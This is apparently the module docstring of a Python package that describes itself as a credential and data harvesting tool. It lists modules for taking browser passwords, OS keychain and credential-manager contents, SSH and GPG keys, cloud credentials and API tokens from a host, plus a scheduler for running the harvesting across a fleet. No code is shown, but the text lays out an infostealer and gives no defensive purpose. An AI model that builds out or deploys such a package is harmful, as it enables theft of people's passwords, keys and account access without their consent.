"""
Credential & data harvesting package.

Provides modules for extracting stored credentials, browser data,
API keys, and SSH keys from the host system.

Modules:
  - **browser_creds** — Chrome, Firefox, Safari password extraction
  - **os_creds** — macOS Keychain, Windows Credential Manager, Linux keyrings
  - **keys** — SSH keys, GPG keys, cloud credentials, API tokens
  - **scheduler** — Orchestrates harvesting with change detection and fleet integration
"""
